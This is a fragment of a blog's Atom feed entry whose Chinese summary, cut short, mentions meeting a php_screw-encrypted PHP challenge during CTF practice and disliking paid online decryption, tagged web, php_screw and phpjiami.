        &lt;h1 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h1&gt;&lt;p&gt;最近练习ctf遇到一道php_screw加密的题目，百度一圈在线解的话需要收费（每次遇到收费解密的题，很烦有木有）。最后在g
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="php_screw" scheme="http://yoursite.com/tags/php-screw/"/>
    
      <category term="phpjiami" scheme="http://yoursite.com/tags/phpjiami/"/>
    
  </entry>
  
</feed>
